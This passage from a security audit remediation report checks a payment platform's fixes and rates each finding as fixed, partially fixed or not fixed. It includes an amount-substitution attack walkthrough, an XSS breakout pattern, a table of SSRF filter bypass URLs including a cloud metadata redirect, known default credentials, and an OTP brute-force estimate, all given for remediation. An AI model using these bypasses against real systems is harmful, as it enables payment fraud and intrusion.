- bKash (bkash.gateway.ts:158): `amount: data.amount ?? null` — bKash's `/tokenized/checkout/execute` returns the transaction's amount, so the classic "10 BDT payment completes 100,000 BDT intent" attack now fails the amount check.

### Attack walkthrough under the new code

1. Attacker creates intent A (100,000 BDT), pays 10 BDT on intent B, receives paymentID_B.
2. Attacker calls A's callback with paymentID_B. bKash `verify` executes paymentID_B: `statusCode=0000`, `amount="10"`.
3. `handleCallback`: `verifyResult.amount = "10"` ≠ `intent.amount = "100000.00"` → transaction marked failed, `amount_mismatch` returned. **Blocked.**

### Residual risk (material, conditional)

1. **The amount check is conditional on the adapter echoing the amount.** `if (verifyResult.amount)` — when an adapter returns `amount: null` (error paths, some providers, manual gateways), the check silently skips and completion proceeds on signature alone. The stronger posture for API gateways is: **completion requires a provider-echoed amount that matches; no echo → no completion** (fall to SMS/webhook corroboration paths, which do enforce the DB amount). Until then, any adapter/edge case that fails to populate `amount` re-opens the substitution window.
2. `parseFloat` + `Math.abs(diff) > 0.001` tolerance instead of the codebase's decimal `cmp()` (lib/money.ts). For 2-dp amounts the float representation is exact enough in practice, but it deviates from the strict decimal discipline and is a latent precision bug. `isNaN` is guarded — good.
3. `verifyResult.trx_id` is not populated by the BD adapters (only `gateway_trx_id`), so the reference-binding branch is currently dead for them; amount equality is the only live guard.

### Regression coverage

None directly: no test drives `handleCallback` with a mismatched amount. **Gap: add an adapter-mocked test** (the adapters accept injected credentials; the test stack already boots real workerd).

### Verdict

```text
FIXED (conditional) — the exploited path is closed for the primary gateways
        that echo amounts; enforcement should be made unconditional for
        API-gateway completions. Residual tracked as NEW-P2-003/004.
```

---

## 5.5 EDGE-P0-005 — Bootstrap default-credential chain mints a root platform key with known values

### Previous finding (summary)

A fresh deploy auto-seeded `AdminPass123456!` + pairing OTP `123456`, stored a root API key in KV, and `/install/bootstrap-key` exchanged the known email+password for a fresh `'*'` key with no install-lock and an install rate limit of 120/min/IP.

### What changed in v0.3.0 — centralized config with production-safe defaults

`src/config/platform.ts` (new) centralizes all bootstrap defaults; `getPlatformConfig()` resolves:

```ts
// platform.ts:124-131
adminEmail    = ADMIN_EMAIL || (production ? null : 'admin@edgepay.internal');
adminPassword = ADMIN_PASSWORD (nullable);
pairingOtp    = DEFAULT_PAIRING_OTP || (production ? randomNumericOtp(6) : '123456');
```

`bootstrap.ts:72`: `initialAdminPass = cfg.admin.password ?? (env === 'production' ? randomUuid() + '!Aa1' : 'AdminPass123456!')`.

`wrangler.jsonc` ships `ENVIRONMENT: "production"`, `ADMIN_PASSWORD: ""`, `DEFAULT_PAIRING_OTP: ""`, `DEFAULT_WEBHOOK_URL: ""` — i.e. **in the shipped production config all known-default credentials are disabled and replaced by CSPRNG values**. The install wizard (`POST /install`) enforces a 12+ char operator password and CSPRNG keys.

### What did NOT change (the remaining chain)

1. **Root API key still stored in plaintext KV** (bootstrap.ts:205): `await env.KV.put('system:root_api_key', newApiKey)`. No code reads it (grep: write-only) — a dormant platform-root credential in a namespace readable by dashboard operators/KV tokens. Should not exist at all.
2. **`/install/bootstrap-key` remains a password oracle.** It is reachable post-install by design ("safe fallback"), exchanges valid admin credentials for a fresh `'*'` key, and is throttled only by the `install` group at **120 req/min/IP** (rate-limit.ts:37). The `'password'` limiter group (10/hour) **exists in the config map but is never mounted on this route** — dead config.
3. **Install lock is KV-only** (`system:installed`, `system:bootstrapped` in KV). No D1-backed lock row. Clearing KV re-opens the wizard.
4. **Bootstrap auto-runs on the first non-install request** (index.ts:83-108): any hit to any path triggers `ensureSystemBootstrapped` via waitUntil when the KV flag is absent — the platform merchant, admin, chart, seeds, OTP, and root key mint **before the operator has necessarily completed the wizard**.
5. Non-production defaults remain deliberately weak (`AdminPass123456!`, `123456`) — acceptable for dev, but any operator who sets `ENVIRONMENT` incorrectly inherits them.

### Verdict

```text
PARTIALLY FIXED
```

The *known-credential* half of the chain is fixed for production deployments. The *plaintext-root-key-in-KV* and *weak-oracle* halves remain, and are carried forward as NEW-P1-001 (KV root key) and NEW-P1-002 (unthrottled credential endpoints with dead limiter config).

---

## 5.6 EDGE-P0-006 — Checkout page: stored XSS via merchant brand color and gateway fields, with no CSP on HTML routes

### Previous finding (summary)

`merchant.color` was interpolated raw into the `<style>` block (`</style><script>` breakout); `account_number`/`instructions` were single-quote-injected into `onclick` JS (escapeHtml did not escape `'`); no CSP was served on HTML routes.

### What changed in v0.3.0 — full-context escaping + CSP mounted

1. **`escapeHtml` now escapes single quotes** (checkout.ts:772-779): `.replace(/'/g, '&#39;')` added.
2. **`sanitizeBrandColor` implemented** (checkout.ts:781-784): `^#[0-9a-fA-F]{6}$` — the rendered `--primary: ${primaryColor}` inside the style block is now provably a 7-char hex literal or the fallback.
3. **Merchant-controlled data moved out of JS string contexts entirely.** Gateway `account_number`/`instructions`/`type` are rendered as `data-*` **attributes** with `escapeHtml` (checkout.ts:608), read in JS via `this.dataset.*` (checkout.ts:674-684), and written to the DOM with **`innerText`** (checkout.ts:668-670) — never `innerHTML`. The remaining `onclick` handlers are static function calls with no interpolation.
4. **CSP is now mounted on checkout surfaces** (checkout.ts:16-22):

```ts
checkoutRoutes.use('*', async (c, next) => {
  c.header('Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline' https://checkout.razorpay.com; " +
    "style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https:; " +
    "frame-ancestors 'none';");
  c.header('X-Content-Type-Options', 'nosniff');
  c.header('X-Frame-Options', 'DENY');
  c.header('Referrer-Policy', 'strict-origin-when-cross-origin');
  await next();
});
```

plus `secureHeaders({ xFrameOptions: 'DENY', ... })` at the app level (index.ts:125-128).

### Residual risk

- `script-src 'unsafe-inline'` is required by the template's inline `<script>` block, so the CSP provides **no XSS containment** — it only restricts external script sources and framing. With the injection vectors closed this is defense-in-depth, not the primary control; converting the template to nonce-based scripts would close the residual. The API-reference page already demonstrates the nonce pattern in-repo.

### Verdict

```text
FIXED   (residual: unsafe-inline CSP — hardening item, not an open vulnerability)
```

---

## 5.7 EDGE-P0-007 — SMS-corroborated completion skips the amount check when `parsed_amount` is NULL and accepts `no_match` SMS

### Previous finding (summary)

The customer TrxID verification path matched `op_sms_data` rows by `parsed_trx_id` with `match_status IN (..., 'no_match')` and completed the payment **without checking `parsed_amount`** — a no_match SMS with a known TrxID completed any-amount intents. The corroboration queue also auto-confirmed on field-count confidence.

### What changed in v0.3.0 — mandatory exact-amount + TrxID binding

**Customer-verify path** (checkout.ts:174-231):

```ts
if (matchingSms) {
  // Exact amount verification (EDGE-P0-007 fix)
  const { cmp } = await import('../lib/money');
  if (!matchingSms.parsed_amount || cmp(matchingSms.parsed_amount, intent.amount) !== 0) {
    return 400 AMOUNT_MISMATCH;
  }
  // only then completeTransaction(...)
}
```

Null amount is now an explicit **rejection** (`!parsed_amount` short-circuits), and comparison uses the decimal `cmp()`.

**SMS queue corroboration path** (sms-corroboration.ts:101-169) — a full decision gate:

- `parser === 'none'` or no amount → `manual_review` (never confirm).
- No TrxID → `manual_review` (TrxID strictly mandatory).
- **Exact amount match** required (`cmp(o.amount, extraction.amount) === 0`; "never closest, never fuzzy").
- Currency match when extracted.
- **Customer-submitted TrxID must match the SMS TrxID** — zero or multiple matches → `manual_review` / `awaiting_customer_trx` (never "pick one").
- Verified sender-ID gateway mapping wins over the LLM guess; gateway conflicts → manual review.

**SMS consumer** (sms-consumer.ts:40-90): a `parser === 'none'` extraction writes **null** `parsed_amount`/`parsed_trx_id` before marking `no_match`, so no_match rows no longer carry usable parsed fields.

### Regression coverage

`sms-corroboration-edgecases.test.ts` — 9 tests covering ambiguity, non-exact amounts, currency mismatch, gateway conflict, clean confirm, sender normalization. `sms-parser-adversarial.test.ts` — Unicode digits, whitespace, malformed input.

### Residual risk

- Low. The verify path's SMS lookup still includes `match_status IN ('pending','parsed','needs_manual_review','no_match')`, but every path through it now requires a non-null amount equal to the intent amount and the customer's exact TrxID. A replayed duplicate TrxID is additionally blocked by the `TRX_ALREADY_USED` check (checkout.ts:157-172) and ledger tx_id dedup.
- The corroboration module has a dead call (`senderToGatewaySlug(null)` at sms-corroboration.ts:152 — always returns null; harmless, cosmetic — NEW-P3-003).

### Verdict

```text
FIXED
```

---

# 6. P1 Findings — Detailed Verification (10)

---

## 6.1 EDGE-P1-001 — Idempotency is not concurrency-safe and keys are not endpoint-scoped

### What changed

The middleware (middleware/idempotency.ts, "payment-integrity" revision) added:
- merchant scoping — lookup by `(merchant_id, key)` (D1 `UNIQUE (merchant_id, key)`, migration 0001:308);
- **body-hash mismatch → 409** (idempotency.ts:120-125);
- **4xx responses never cached** (only 2xx/3xx; idempotency.ts:146-148);
- body hashing via `raw.clone()` (does not consume the stream — idempotency.ts:83-91);
- **refunds require the key** (`required: true`, 400 without);
- expired rows deleted synchronously before re-processing (idempotency.ts:111-118);
- concurrent INSERTs use `ON CONFLICT DO NOTHING` via `waitUntil` (idempotency.ts:157-177).

Tests: `payment-integrity.test.ts` — replay returns cached 201; body-hash mismatch 409; 400 not cached and leaves no row; merchant scoping (same key different merchants → two distinct payments); "concurrent requests with same key do not throw 500".

### What remains

1. **The concurrency window is still open.** The idempotency row is inserted **after** the response, in `waitUntil` (idempotency.ts:163). Two requests with the same key arriving while the first is still in flight (row not yet written) will **both execute the payment**. The test only asserts no-500 for concurrent same-key requests, not single-economic-effect. Correct designs reserve the key *before* processing (insert a `pending` row with a short lease; the loser waits or 409s). This is exactly-once semantics traded for at-least-once with a replay cache — acceptable for read-ish operations, **not for payment initiation**.
2. **Keys are still not endpoint-scoped**: the same key + same body on two different POST endpoints returns the cached response of the first.

### Verdict

```text
PARTIALLY FIXED
```

---

## 6.2 EDGE-P1-002 — Mobile pairing OTP is brute-forceable

### What changed

Nothing functional. The OTP itself is now CSPRNG-generated in production (`randomNumericOtp(6)`, platform.ts:131); the default `123456` applies only to non-production. The 6-digit format check `/^\d{6}$/` remains.

### What remains — everything operational

- **No rate limit is mounted on `/api/mobile/v1/pair` or `/devices`.** Grep across `src/` shows `perIpRateLimit('install')` is the **only** anonymous limiter ever mounted (index.ts:185). The `'otp'` group (10/hour/IP) and `'password'` group (10/hour/IP) are **defined in `ANON_ROUTE_LIMITS` (rate-limit.ts:38-39) and never referenced by any route** — dead configuration that *looks* like protection.
- No attempt counting, no lockout, no exponential backoff on the pairing token.
- Pairing tokens live 30 days (`expires_at = now + 30d`, install.ts:211, bootstrap.ts:158) — a 6-digit static secret valid for a month with unlimited verification attempts is brute-forceable in minutes-to-hours (1e6 space, unthrottled).

### Verdict

```text
NOT FIXED  (only the default-OTP generation improved; the brute-force surface is unchanged)
```

---

## 6.3 EDGE-P1-003 — Inbound webhook: no body-size cap, non-deterministic event ids, fail-open geo layer

### What changed

- **Layered ingress design** (webhooks.ts:100-116): Layer 1 = per-gateway **data-driven IP allowlists** (`op_gateway_ips`, migration 0003:78-84 — CIDRs editable without redeploy, 60s module cache); Layer 2 = geo fallback **only when no allowlist exists** (BD/AF/SG/US); Layer 3 = signature verification **always required** (adapter.verifyWebhook, 401 with a logged delivery row on failure).
- Disabled/unregistered gateways are indistinguishable (404 UNKNOWN_GATEWAY — no inventory leak, webhooks.ts:60-65).
- Event dedup via `UNIQUE (merchant_id, gateway, event_id)` + pre-check (webhooks.ts:158-171).
- Webhook lag metric when the provider timestamp is present.

### What remains

1. **No body-size cap.** `const rawBody = await c.req.text()` (webhooks.ts:131) — unbounded. A huge POST to `/webhook/bkash` (before signature rejection) burns Worker CPU/memory and a D1 write on the failure-log insert.
2. **Random event-id fallback.** `const event_id = payload.id ?? payload.event_id ?? crypto.randomUUID()` (webhooks.ts:159). For providers whose payloads carry no id, **every redelivery gets a fresh uuid → dedup never matches → the event re-processes**. Completion is protected downstream (ledger tx_id dedup, guarded status writes), but event recording and metrics are not. Prefer `sha256(gateway + rawBody)` as the synthetic id.
3. **Geo layer still fails open when `cf.country` is absent** (`else if (c.req.raw.cf?.country)`, webhooks.ts:109). Signature remains the real gate.

### Verdict

```text
PARTIALLY FIXED  (allowlist layer + disabled-gateway 404 added; size cap, event-id determinism, geo fail-open remain)
```

---

## 6.4 EDGE-P1-004 — Outbound webhook SSRF filter misses IPv6 private space, IPv4-mapped IPv6, integer IPs, and redirect targets; deliveries carry no idempotency key

### What changed

Essentially nothing. `isAllowedWebhookUrl` (queues/webhook-consumer.ts:119-166) is the same hostname-string matcher; it gained an explicit enumeration of `172.16.`–`172.31.` and `.local`/`.internal`/`.localhost` suffix blocking. HTTP-timeout via AbortController (15s) was already present.

### What remains — the full bypass catalogue

| Vector | Example | Blocked? |
|---|---|---|
| IPv6 loopback | `::1` | yes |
| **IPv6 ULA** | `https://fd12:3456:789a::1/` | **no** |
| **IPv6 link-local** | `https://fe80::1/` | **no** |
| **IPv4-mapped IPv6** | `https://[::ffff:127.0.0.1]/` | **no** |
| **IPv4-mapped IPv6 (hex)** | `https://[::ffff:7f00:1]/` | **no** |
| **Integer IPv4** | `https://2130706433/` (127.0.0.1) | **no** |
| **Hex IPv4** | `https://0x7f.0.0.1/` | **no** |
| **Octal IPv4** | `https://0177.0.0.1/` | **no** |
| DNS rebinding | `https://attacker.com/` → A 127.0.0.1 | **no** |
| **Redirect to private** | public URL 302 → `http://169.254.169.254/` | **no** (fetch default `redirect: 'follow'`) |
| `0.0.0.0`, `169.254.*`, `192.168.*`, `10.*`, `127.0.0.1`, `localhost` | | yes (string forms only) |

Also unchanged: deliveries carry **no idempotency key header**; retry classification treats **400/401/403/404 as retryable** (only 410/422 terminal — webhook-consumer.ts:72-79); `payload_hash` stores the literal `'system'`.

The correct fix: canonicalize the hostname (strip brackets, lowercase, reject alternate IP encodings via a real IP parser), set `redirect: 'error'` on the delivery fetch, and (best) resolve+validate at registration time and pin the resolved IP.

### Verdict

```text
NOT FIXED
```

---

## 6.5 EDGE-P1-005 — Any merchant admin key can list all merchants and provision new tenants (harvesting their root keys)

### What changed

A Cloudflare Access gate was added in front of the admin API: `app.use('/api/admin/*', accessAuthMiddleware())` (index.ts:176). The middleware (cloudflare-access.ts:279-433):
- verifies `Cf-Access-Jwt-Assertion` against the team JWKS (ES256 raw/DER + RS256; iss/aud/exp fail-closed; kid-aware with cache refresh);
- fails closed on missing config (401 with bearer fall-through) and JWKS unreachable (503);
- break-glass service-token path is audit-alarmed (`page()` on every use/denial);
- **pass-through for bearer API keys**: a valid `op_live_…` key with `admin`/`*` scope satisfies the Access gate directly (cloudflare-access.ts:284-329).

### What did NOT change — the escalation itself

`GET /api/admin/v1/merchants` (admin-api.ts:247-255) and `POST /api/admin/v1/merchants` (admin-api.ts:256-394) still:

- require only `requireBearerApiAuth(['admin'])` at the router level + `requireScope('admin')` per route;
- contain **no `is_platform` check** — the key's merchant need not be the platform merchant;
- `POST` provisions a full tenant (merchant, admin user, chart, gateways, pairing OTP) and returns **`api_key` (scopes `read,write,admin,*`), `pairing_otp`, and `webhook_secret` in the JSON response** (admin-api.ts:358-369).

Because the Access middleware's bearer path passes any admin-scoped key, **the escalation path is identical to the previous version**: merchant A's admin key → `POST /api/admin/v1/merchants` → root key of the new tenant → full cross-tenant financial access. The Access gate hardens the *browser/human* admin path, not the *programmatic* one.

### Verdict

```text
NOT FIXED  (the new Access layer is real hardening for the human path; the
            escalation via bearer keys is untouched)
```

---

## 6.6 EDGE-P1-006 — Unguarded status writes: completed payments can regress; reconciliation never heals payment rows

### What changed

- **Failure paths are now guarded.** All `→ 'failed'` writes in `handleCallback` carry `AND status IN ('pending','processing','created')` (payment.ts:321, 330, 339) — a completed transaction can no longer regress to failed via a late failed callback.
- The expiry cron is guarded (`WHERE status IN ('pending','processing') AND expires_at < ?`, cron/handler.ts:113-117).
- `completeTransaction` was reordered: **ledger posting first (awaited), then atomic D1 batch** marking tx + intent completed (payment.ts:395-419) — the recoverable write-ahead row exists before completion is claimed.

### What remains

- `completeTransaction`'s status writes remain **unguarded** (`UPDATE … SET status = 'completed' WHERE id = ?`, payment.ts:409-419). Consequences: an **expired** intent can be flipped to completed by a late callback/SMS. Money-wise this is safe (ledger posting is idempotent and amount-bound), but the "expired" terminal state is not terminal, and reporting/state-machine hygiene is violated.
- **Reconciliation still never heals `op_transactions` / `op_payment_intents`.** The sweep replays `op_ledger_postings` and verifies DO-vs-D1 ledger consistency, but no path repairs a payment row stuck in `pending`/`processing`/`awaiting_verification` when the ledger already posted. A payment whose ledger posted but whose completion batch failed remains "processing" in D1 forever while the books say money moved.

### Verdict

```text
PARTIALLY FIXED  (regression-to-failed closed; expired→completed and
                   payment-row healing remain open)
```

---

## 6.7 EDGE-P1-007 — `createIntent` is not atomic and auto-seeds a manual gateway under a race

### What changed

- `op_gateways` has `UNIQUE (merchant_id, slug)` (migration 0001:61) — the race now **throws** (D1 UNIQUE violation → 500) instead of creating duplicate gateway rows. The INSERT uses `meta.last_row_id` with a uuid-based fallback lookup (payment.ts:107-113).

### What remains

- Under the seeding race, one of the two concurrent `createIntent` calls **500s** mid-flow. The intent insert and transaction insert are still **separate, non-batched statements** — a crash between them leaves an orphan intent with no transaction row.
- The seeding is still auto-triggered implicitly on first payment rather than at provisioning time.

### Verdict

```text
PARTIALLY FIXED  (no duplicate rows; race still yields 500s; partial-failure
                   orphans remain — a D1 batch would close both)
```

---

## 6.8 EDGE-P1-008 — Scope enforcement gaps: read-only keys can create payments and mutate webhook configuration

### What changed

- `POST /refunds` → `requireScope('write')` (api.ts:150).
- `POST /api-keys` → `requireScope('admin')` (api.ts:266).
- The admin API router gates everything behind `['admin']` + per-route `requireScope('admin')`.

### What remains

- **`POST /payments` has no write-scope guard.** Router-level `requireBearerApiAuth(['read','write','admin'])` (api.ts:24) admits a **read-only** key; no `requireScope('write')` is chained on the payments route. A read-scoped integration key can therefore **initiate payments** (financial mutation).
- **`POST /webhooks` and `DELETE /webhooks/:id` have no write-scope guard** (api.ts:318-356): a read-only key can register an outbound webhook URL (SSRF pivot — see 6.4) or delete an existing one.
- `POST /webhooks/tests` likewise unscoped.

### Verdict

```text
PARTIALLY FIXED
```

---

## 6.9 EDGE-P1-009 — Security regression tests are broken: tenant-routing JWT suite crashes, lint cannot run

### What changed

- **The tenant-routing suite is fixed and passing** (tenant-routing.test.ts — cross-tenant 403s for API-key and JWT, master-domain bypass, install/assets/favicon bypasses). All 212 tests pass, including `access-jwt.test.ts` (full fail-closed matrix) and `api-middleware.test.ts` (CORS allowlist fail-closed, security headers).

### What remains

- **Lint still cannot run**: ESLint 9.39 requires `eslint.config.js` (flat config); the repo has none and `package.json` still calls `eslint src --ext .ts`. `npm run lint` errors out. The fix is a ~20-line flat config.
- TEST_RESULTS.md counts remain stale (104 vs 212).

### Verdict

```text
PARTIALLY FIXED
```

---

## 6.10 EDGE-P1-010 — KV-based per-IP rate limiting is racy; install misconfigured (120/min vs documented 3/hour); anonymous auth surfaces unthrottled

### What changed — a real architectural improvement

- **Authenticated routes now use the native Workers Ratelimit binding, keyed per API key** (mounted after bearer auth; `RATE_LIMIT_READ` 120/min GET, `RATE_LIMIT_WRITE` 30/min non-GET — rate-limit.ts:61-99, wrangler.jsonc:221-232). Correct primitive: cross-IP per-key quotas, no KV race, no write-quota burn.
- Degradation (binding absent) fails **open with a metric** (`rate_limit_degraded`) — a documented availability-over-abuse tradeoff (rate-limit.ts:75-80).
- Install routes get the per-IP KV limiter mounted before the router (index.ts:185).

### What remains

- **Install group is 120/min/IP** (rate-limit.ts:37) while index.ts:181 comments "3/hour" — the previous mismatch persists verbatim.
- **`/install/bootstrap-key`** is covered only by the install group (120/min/IP) — a password oracle at 2/sec/IP.
- **Anonymous auth surfaces are still unthrottled**: `/api/mobile/v1/pair` (OTP), checkout `/:token/verify` (TrxID probing), `/install/bootstrap-key` (password). The `'otp'`/`'password'` groups exist but are never mounted.
- The per-IP KV limiter remains a read-modify-write race. Acceptable for coarse abuse; not a security boundary.

### Verdict

```text
PARTIALLY FIXED
```

---

# 7. P2 Findings — Detailed Verification (20)

## 7.1 EDGE-P2-001 — CSRF middleware is dead code (never mounted)
**NOT FIXED.** `csrfMiddleware` is exported (middleware/csrf.ts:36) and `AppVariables.csrfToken` is declared (index.ts:289), but **no mount anywhere**. Mitigating context: the API is bearer-token (no cookie auth), CORS is fail-closed with `credentials: false` — practical CSRF exposure is minimal; but then the middleware should be deleted, not shipped.

## 7.2 EDGE-P2-002 — DO fault-injection seam guarded by a magic env combination
**PARTIALLY FIXED.** `__testInjectFault` now throws in production unless `ALLOWED_ORIGINS === 'https://allowed.example'` (ledger-do.ts:381-386), and `runtime-integrity.test.ts` pins the guard's existence. Residual: the sentinel is an arbitrary magic value (a dedicated `TEST_FAULT_INJECTION` secret would be cleaner); RPC-exposed test seams on a financial DO remain a design smell.

## 7.3 EDGE-P2-003 — Platform merchant excluded from consistency verification
**NOT FIXED.** `verifyAllMerchants` still filters `WHERE status = 'active' AND is_platform = 0` (reconciliation.ts:168). The platform merchant's own book is never verified for drift.

## 7.4 EDGE-P2-004 — Webhook merchant resolution on the master domain binds to the platform merchant
**NOT FIXED.** The fallback resolution still `ORDER BY m.is_platform DESC` (webhooks.ts:76).

## 7.5 EDGE-P2-005 — Ratelimit binding absence fails open on write endpoints
**UNCHANGED (documented decision).** Missing `RATE_LIMIT_WRITE` → allow + `rate_limit_degraded` metric. The rationale is defensible for reads; for payment mutations the recommendation stands: fail closed or page.

## 7.6 EDGE-P2-006 — Analytics Engine binding commented out: all metrics are silent no-ops
**NOT FIXED.** `wrangler.jsonc:239-241` keeps the binding commented ("opt-in after first deploy"); `metric()`/`page()` no-op without it (observability.ts:37,61). Every metric call across the codebase (webhook rejections, rate-limit degradation, SMS parse misses, reconciliation drift) is **inert in the shipped deployment**. `page()` partially falls back to console logs — metrics do not.

## 7.7 EDGE-P2-007 — No outbox: crash between D1 commit and queue send loses the merchant webhook
**NOT FIXED.** `completeTransaction` awaits `dispatcher.dispatch()` (payment.ts:423-434) which `sendBatch`es to the queue — but there is no D1 outbox. A crash between the completion batch commit and the queue send loses the merchant notification permanently. Fix shape: `op_webhook_outbox` row written in the same D1 batch as the status flip; a cron drains outbox → queue.

## 7.8 EDGE-P2-008 — D1 mirror dedup guard drops legitimate identical journal lines
**NOT FIXED.** The audit-trail insert guards each entry with `NOT EXISTS (… ledger_transaction_id, account_id, direction, amount)` (ledger-audit.ts:101-129). A legitimately balanced transaction containing **two identical journal lines** writes only one mirror row → DO and D1 mirror drift → false-positive drift pages. Latent-structural (current chart generates no such postings). Fix: add a line ordinal to the predicate.

## 7.9 EDGE-P2-009 — Wrong/rotated ENCRYPTION_KEY degrades silently
**NOT FIXED.** `decrypt()` throws on auth failure; every caller catches and **skips** the field (`catch { /* skip */ }` — payment.ts:309, refund.ts:178-179, webhooks.ts:126-127, refund-reconciliation.ts:269-271). A rotated/typo'd key manifests as *empty credentials* rather than a loud alarm. Recommend `page('ENCRYPTION_KEY_MISMATCH')` on credential-envelope decrypt failure.

## 7.10 EDGE-P2-010 — Single versionless ENCRYPTION_KEY; no rotation path; platform-wide blast radius
**NOT FIXED.** Envelope is still `base64(iv || ct || tag)`; no key id/version, no dual-key decrypt window, no rotation runbook.

## 7.11 EDGE-P2-011 — Break-glass comparison is not timing-safe; JWKS fetch has no timeout
**NOT FIXED.** Break-glass compares with `===` (cloudflare-access.ts:338-342). The JWKS fetch has no `AbortSignal` timeout (cloudflare-access.ts:254-256). Fix: `timingSafeEqual` on both; `AbortSignal.timeout(5000)` on the JWKS fetch.

## 7.12 EDGE-P2-012 — LedgerDO does not verify payload.merchant_id matches its own identity
**NOT FIXED.** Nothing asserts `payload.merchant_id` equals the DO's `merchant-{id}` name identity. Unreachable by external callers today, but a one-line defense-in-depth check would make the DO self-protecting against future internal bugs.

## 7.13 EDGE-P2-013 — `op_api_keys.key_prefix` lacks a UNIQUE constraint
**NOT FIXED.** Plain index only (migration 0001:122). Colliding prefixes yield spurious 401s (availability) and conflated analytics. Fix: unique index + prefix regeneration on collision.

## 7.14 EDGE-P2-014 — Unbounded/unchecked inputs on public surfaces
**NOT FIXED.** No content-length/body-size caps on webhook ingress, API JSON bodies, or mobile `sms/batch` (array length unbounded). `GET /transactions` caps `limit` at 100 (good); `offset` unvalidated.

## 7.15 EDGE-P2-015 — SMS regex templates are merchant-editable and compiled with `new RegExp` (ReDoS)
**NOT FIXED.** `new RegExp(tpl.regex_pattern, 'i')` (sms-parser.ts:183) with merchant-supplied patterns (admin `PUT /sms-templates/:id`). A catastrophic-backtracking pattern burns CPU inside the Worker; a single malicious template freezes that merchant's SMS pipeline. Fix: pattern validation or timeout-wrapped parsing; cap pattern length.

## 7.16 EDGE-P2-016 — `ENABLED_GATEWAYS` unset ⇒ every adapter enabled (fail-open default)
**PARTIALLY FIXED.** The `gatewaySelection` parser is fail-closed for typo'd-only lists and surfaces `dropped_aliases`; `wrangler.jsonc` ships an explicit list. **Unset still = all enabled** (documented back-compat). Recommendation: require the var in production.

## 7.17 EDGE-P2-017 — PBKDF2 default 50K vs documented 600K; env can lower to 10K
**NOT FIXED.** `PBKDF2_ITERATIONS = 50_000`, `MIN = 10_000` (crypto.ts:28-29) while the header comment claims 600K (crypto.ts:11). Document the actual number; raise the production floor.

## 7.18 EDGE-P2-018 — No payment-amount ceiling at the API boundary
**NOT FIXED.** `moneySchema = /^\d+(\.\d{1,2})?$/` (validation.ts:20-22) — no magnitude cap. The DO enforces `MAX_AMOUNT_MINOR` (90M major units) at posting → a >90M intent completes the checkout flow but can never settle. Add a `.refine()` ceiling at the schema.

## 7.19 EDGE-P2-019 — Currency-specific minor-unit exponents are ignored
**NOT FIXED.** `toMinorUnits(amount, exponent = 2)` supports the parameter (money.ts:89) but every posting-path caller uses exponent 2 regardless of currency. JPY/BHD-style currencies would mis-scale 10-1000×. Latent (deployment is BDT/USD-centric). Fix: `exponentFor(currency)` threaded through `buildPayload`.

## 7.20 EDGE-P2-020 — Exchange rates fetched and stored without validation; no timeout
**NOT FIXED.** `updateExchangeRates` (cron/handler.ts:182-189): `fetch('https://open.er-api.com/v6/latest/USD')` with no timeout, no sanity bounds (0 < rate < 1000, finite), no staleness guard.

---

# 8. P3 Findings — Detailed Verification (12)

## 8.1 EDGE-P3-001 — Dead schema states
**NOT FIXED.** `callback_processing`, `pending_review`, `disputed`, `refunded` remain only in the `types/db.ts` union and the CHECK constraint; no code writes them. (`awaiting_verification` *is* written by checkout verify.) Implement or drop.

## 8.2 EDGE-P3-002 — Mobile `authSubject`/`device_id` identity confusion
**NOT FIXED.** `requireJwtAuth` sets `authSubject = parseInt(payload.sub)` — the **user** id (auth.ts:158) — while mobile routes use it as `device_id` (mobile.ts:126, 182, 235, 241). The JWT payload carries `device_id` but the middleware ignores it. Heartbeats/notifications target user-id-as-device-id rows.

## 8.3 EDGE-P3-003 — Mobile notification ack cross-tenant
**NOT FIXED.** `POST /notifications/acknowledgements` updates by bare `id IN (…)` with no merchant/device predicate (mobile.ts:250-262). One-line fix: `AND merchant_id = ? AND device_id = ?`.

## 8.4 EDGE-P3-004 — Pairing flow race + `last_insert_rowid` misuse
**PARTIALLY FIXED.** refund.ts and install.ts use `meta.last_row_id` / uuid re-select. mobile.ts still uses the standalone `SELECT last_insert_rowid()` (mobile.ts:66-68).

## 8.5 EDGE-P3-005 — Maintenance reason interpolated unescaped into HTML
**NOT FIXED.** `<p>${info.reason}</p>` (maintenance.ts:79). KV-controlled operator string; wrap with `escapeHtml`.

## 8.6 EDGE-P3-006 — sms-phone-mockup `/api/forward` is an unauthenticated open proxy
**NOT FIXED.** server.js:500-545 forwards arbitrary URL/method/headers/body; listens on **`0.0.0.0`** (server.js:674). Dev-only tool; if run on a reachable host it is a full SSRF relay. Fix: bind 127.0.0.1, require a token, refuse private IPs.

## 8.7 EDGE-P3-007 — `secretToBytes` base64 heuristic
**NOT FIXED.** crypto.ts:131-141: raw secrets that happen to be valid base64 are silently decoded — interop hazard. Fix: explicit `('raw' | 'base64')` per call site.

## 8.8 EDGE-P3-008 — `op_webhook_deliveries.payload_hash` stores the literal `'system'`
**NOT FIXED.** webhook-consumer.ts:110. Fix: store `sha256(jsonPayload)`.

## 8.9 EDGE-P3-009 — Outbound webhook retry treats 400/401/404 as retryable
**NOT FIXED.** Only 410/422 terminal (webhook-consumer.ts:72-79). Terminal-ize 400/401/403/404; retry 408/429/5xx.

## 8.10 EDGE-P3-010 — Duplicate-instance detection by error-string matching
**NOT FIXED (by design).** reconciliation.ts:267-291 multi-shape-matches "already exists"/409. Resilient fallback; upstream typed error preferred.

## 8.11 EDGE-P3-011 — sms-consumer writes parsed fields before the parse-miss branch
**PARTIALLY FIXED.** A `parser === 'none'` extraction writes nulls then flips to `no_match`. Inert after the P0-007 fix; cosmetic residual.

## 8.12 EDGE-P3-012 — Docs/report drift
**PARTIALLY FIXED.** README/OpenAPI updated; TEST_RESULTS.md still reports 11 files/104 tests (actual 21/212); index.ts comment (3/hour) vs code (120/min); crypto.ts comment (600K) vs code (50K).

---

# 9. Consolidated Remediation Matrix

| ID | Title (short) | Previous Sev | Verdict | Fix mechanism (if any) | Residual |
|---|---|---|---|---|---|
| P0-001 | Live secrets committed | P0 | **PARTIAL** | env-first in verify scripts | literals + .dev.vars remain; un-rotated; no CI scanner |
| P0-002 | Refund wrong-row reversal | P0 | **FIXED** | rewrite keyed `m{m}:refund:{publicId}` | dead `reverse()` API remains |
| P0-003 | Unbounded refunds / no ledger | P0 | **FIXED** | single RefundService path + bounds + workflow | TOCTOU race on bound; float check |
| P0-004 | Callback amount/intent binding | P0 | **FIXED (cond.)** | amount+trx_id checks in handleCallback | conditional on adapter echo; parseFloat; no reg-test |
